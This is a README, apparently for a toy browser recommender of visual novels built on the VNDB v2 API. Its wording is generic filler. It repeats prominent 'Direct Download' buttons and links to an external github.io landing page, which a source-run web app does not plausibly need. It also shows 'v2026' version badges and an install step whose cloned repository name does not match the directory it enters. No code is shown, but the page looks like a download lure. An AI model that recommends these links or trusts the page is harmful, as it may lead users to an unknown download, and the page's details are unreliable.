# Visual Novel Affinity v2026 - recommender system 2026

> **Visual Novel Affinity is a browser-based recommendation tool for visual novels, built on VNDB v2 data and tags to suggest related titles from either tag groups or a single VN.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverhub1988/visual-novel-affinity-hub?style=flat-square)](https://github.com/oliverhub1988/visual-novel-affinity-hub)

---

<p align="center">
  <a href="https://oliverhub1988.github.io/visual-novel-affinity-hub/">
    <img src="https://img.shields.io/badge/Download-Visual%20Novel%20Affinity%20Latest-brightgreen?style=for-the-badge" alt="Download Visual Novel Affinity">
  </a>
</p>

> **[Direct Download - Visual Novel Affinity v2026](https://oliverhub1988.github.io/visual-novel-affinity-hub/)**

---

[Download Latest Build](https://oliverhub1988.github.io/visual-novel-affinity-hub/)

---

## Overview

Visual Novel Affinity is a compact web project made to help users find visual novels through recommendation logic instead of manual catalog browsing. It supports either a set of tags or a single visual novel as the starting point, which makes it handy when you already have part of your taste profile and want close matches quickly.

Its data source is the VNDB.org v2 API, so the suggestions are driven by visual novel metadata and tag relationships. Although it is presented as a toy project, it still offers a practical way to explore affinity-based matches and compare related works through a straightforward web interface.

---

## What It Does

- Generates visual novel recommendations from tag combinations
- Lets you start from one visual novel and find similar titles
- Pulls data through the VNDB.org v2 API
- Runs as a web-based recommendation utility
- Centers recommendations around visual novel tags and affinity
- Keeps the implementation lightweight and toy-project oriented
- Supports fast discovery and browsing sessions
- Targets visual novel-specific recommendation use cases

---

## Installation

You can clone the repository or download the project files, then open the web app in a browser.

1. Get the source:
   - `git clone https://github.com/oliverhub1988/visual-novel-affinity-hub.git
2. Enter the project directory:
   - `cd visual-novel-affinity-recommender`
3. Open the HTML entry point in your browser or serve the folder with any static web server.

If you are using a local server, start it and load the app from the server address shown in your terminal.

---

## How to Use It

Begin with one of the supported input methods:

- Provide a tag set to narrow down the recommendation pool
- Pick or reference one visual novel to discover related titles

Typical workflow:

1. Enter tags or choose a source VN
2. Allow the app to query VNDB data
3. Look through the recommended visual novels
4. Tweak the tags or seed title to improve the results

Because the project is web-based, it is usually used directly in the browser after the files are opened or served.

---

## Configuration

Configuration depends on the way the app is hosted.

For local use, settings are generally handled in the project files or through the browser-facing interface. If you are connecting to VNDB, ensure that any API-related values or request settings are placed where the app expects them in the source structure.

Example of the kind of values you may need to review:

    {
      "api": "VNDB.org v2",
      "inputMode": "tags or single visual novel",
      "output": "visual novel recommendations"
    }

---

## Requirements

- A web browser
- Access to the VNDB.org v2 API
- A local static server if you prefer not to open files directly
- HTML support for running the project interface

---

## FAQ

**How do I get recommendations?**  
Enter either a set of tags or one visual novel, then let the app produce related suggestions.

**Does it need VNDB data?**  
Yes. The project is built around the VNDB.org v2 API.

**Can I change how it recommends titles?**  
Any changes to behavior would depend on the source and how the tag or VN lookup logic is implemented.

**What if the page does not load correctly?**  
Check your browser, confirm the files are being served correctly, and verify that the VNDB API can be reached.

**Is this a full production system?**  
No. The repository is described as a toy project, so treat it as a compact reference or experimental recommender.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
